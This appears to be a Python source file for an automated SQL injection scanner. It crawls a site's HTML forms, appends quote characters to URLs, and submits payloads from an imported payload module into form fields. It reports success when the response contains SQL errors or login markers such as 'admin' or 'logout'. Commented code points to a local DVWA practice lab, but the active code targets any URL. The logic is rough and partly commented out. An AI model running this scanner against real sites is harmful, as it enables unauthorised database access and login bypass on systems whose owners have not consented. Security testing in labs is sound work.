import requests,sys,time
# import re # uncomment this for DVWA
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
from pprint import pprint
import payloads

s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"

# below code is for logging to your local DVWA
# uncomment it if you want to use this on DVWA
# login_payload = {
#     "username": "admin",
#     "password": "password",
#     "Login": "Login",
# }
# # change URL to the login page of your DVWA login URL
# login_url = "http://localhost:8080/DVWA-master/login.php"

# # login
# r = s.get(login_url)
# token = re.search("user_token'\s*value='(.*?)'", r.text).group(1)
# login_payload['user_token'] = token
# s.post(login_url, data=login_payload)

def sqlinjection_detectform(url):
	detect_form = 0
	try:
		def slowprint(s):
			for c in s + '\n' :
				sys.stdout.write(c)
				sys.stdout.flush()
				# time.sleep(10. / 100)
				
		def get_all_forms(url):
			"""Given a `url`, it returns all forms from the HTML content"""
			soup = bs(s.get(url).content, "html.parser")
			return soup.find_all("form")


		def get_form_details(form):
			"""
			This function extracts all possible useful information about an HTML `form`
			"""
			details = {}
			# get the form action (target url)
			try:
				action = form.attrs.get("action").lower()
			except:
				action = None
			# get the form method (POST, GET, etc.)
			method = form.attrs.get("method", "get").lower()
			# get all the input details such as type and name
			inputs = []
			for input_tag in form.find_all("input"):
				input_type = input_tag.attrs.get("type", "text")
				input_name = input_tag.attrs.get("name")
				input_value = input_tag.attrs.get("value", "")
				inputs.append({"type": input_type, "name": input_name, "value": input_value})
			# put everything to the resulting dictionary
			details["action"] = action
			details["method"] = method
			details["inputs"] = inputs
			return details


		def is_vulnerable(response):
			"""A simple boolean function that determines whether a page 
			is SQL Injection vulnerable from its `response`"""
			errors = {
				# MySQL
				"you have an error in your sql syntax;",
				"warning: mysql",
				# SQL Server
				"unclosed quotation mark after the character string",
				# Oracle
				"quoted string not properly terminated",

				#Another
				"invalid csrf token",
				"administrator",
				"admin",
				"logout"
			}
			# print(response.content.decode().lower())
			for error in errors:
				# if you find one of these errors, return True
				if error in response.content.decode().lower():
					# print(error)
					return True
			# no error detected
			return False

		
		# def vulnerable(response):
		# 	slowprint(f"\033[91m [+] SQL Injection vulnerability detected, link: {url}")
		# 	slowprint("\033[92m [+] Form:")
		# 	pprint(form_details)


		def scan_sql_injection(url):
			array = set()
			array_form = set()
			# test on URL
			for c in "\"'":
				# add quote/double quote character to the URL
				new_url = f"{url}{c}"
				print("\033[93m [!] Trying", new_url)
				# make the HTTP request
				res = s.get(new_url)
				# print(res)
				if is_vulnerable(res):
					# print("chay khong")
					# SQL Injection detected on the URL itself, 
					# no need to preceed for extracting forms and submitting them
					print("\033[91m [+] SQL Injection vulnerability detected, link:", new_url)
					return
			# test on HTML forms
			forms = get_all_forms(url)
			# print(get_form_details(forms[0]))
			slowprint(f"\033[92m [+] Detected {len(forms)} forms on {url}.")
			for form in forms:
				form_details = get_form_details(form)
				for c in "\"'":
					# the data body we want to submit
					data = {}
					for input_tag in form_details["inputs"]:
						if input_tag["value"] or input_tag["type"] == "hidden":
							# any input form that has some value or hidden,
							# just use it in the form body
							try:
								# data[input_tag["name"]] = input_tag["value"] + c
								data[input_tag["name"]] = input_tag["value"]
							except:
								pass
						elif input_tag["type"] != "submit":
							# all others except submit, use some junk data with special character
							# data[input_tag["name"]] = f"administrator'--"
							# form_details[input_tag["name"]] = f"administrator'--"
							# print(data[input_tag["name"]])
							# print(payloads.anotherSqlinjection)

							for payload in payloads.anotherSqlinjection:
								# print(form)
								data[input_tag["name"]] = payload
								form_details[input_tag["name"]] = payload
								# join the url with the action (form request URL)
								url = urljoin(url, form_details["action"])
								getFormAction = form_details["action"]
								if "search" in getFormAction:
									isNotVul = True
									for c in "\"'":
										# add quote/double quote character to the URL
										new_url = f"{url}{c}"
										print("\033[93m [!] Trying", new_url)
										# make the HTTP request
										res = s.get(new_url)
										# print(res)
										if is_vulnerable(res):
											# print("chay khong")
											# SQL Injection detected on the URL itself, 
											# no need to preceed for extracting forms and submitting them
											isNotVul = False
											print("\033[91m [+] SQL Injection vulnerability detected, link:", new_url)
											return 
										if isNotVul:


											# testing
											if form_details["method"] == "post":
												# print('method: POST')
												# here using session to request. Because the session has already then brute force workings not work
												# res = s.post(url, data=data) 
												res = requests.post(url, data=data)
												if "logout" in res.content.decode().lower():
													print(f"\033[92m [+] Payload using:  ",data)
												# array.add(res)
												# pprint(form_details)
												# print(data)
												# print(payload)
												# print(res.text)
											elif form_details["method"] == "get":
												res = s.get(url, params=data)
												# array.add(res)
												# pprint(form_details)

											if is_vulnerable(res):
												slowprint(f"\033[91m [+] SQL Injection vulnerability detected, link: {url}")
												# slowprint("\033[94m [+] Form:")
												# pprint(form_details)
												# print(res.status_code)
												# break 
											# testing

									
								else:		
									if form_details["method"] == "post":
										# print('method: POST')
										# here using session to request. Because the session has already then brute force workings not work
										# res = s.post(url, data=data) 
										res = requests.post(url, data=data)
										if "logout" in res.content.decode().lower():
											print(f"\033[92m [+] Payload using:  ",data)
										# array.add(res)
										# pprint(form_details)
										# print(data)
										# print(payload)
										# print(res.text)
									elif form_details["method"] == "get":
										res = s.get(url, params=data)
										# array.add(res)
										# pprint(form_details)

									if is_vulnerable(res):
										slowprint(f"\033[91m [+] SQL Injection vulnerability detected, link: {url}")
										# slowprint("\033[94m [+] Form:")
										# pprint(form_details)
										# print(res.status_code)
										# break 
			# pprint(array)
			# pprint(form_details)
				
					# # join the url with the action (form request URL)
					# url = urljoin(url, form_details["action"])
					# if form_details["method"] == "post":
					# 	# print('method: POST')
					# 	res = s.post(url, data=data)
					# 	# print(data)
					# 	# print(res.text)
					# elif form_details["method"] == "get":
					# 	res = s.get(url, params=data)



					# test whether the resulting page is vulnerable
					# if is_vulnerable(res):
					# 	slowprint(f"\033[91m [+] SQL Injection vulnerability detected, link: {url}")
					# 	slowprint("\033[94m [+] Form:")
					# 	pprint(form_details)
					# 	break 

			detect_form = len(forms)  
			# print(detect_form)
			return detect_form

		# if __name__ == "__main__":
			# import sys
			# url = sys.argv[1]
		return scan_sql_injection(url)
		
	except KeyboardInterrupt:
		slowprint("\n\033[91m [-] Exiting...")
	# return detect_form
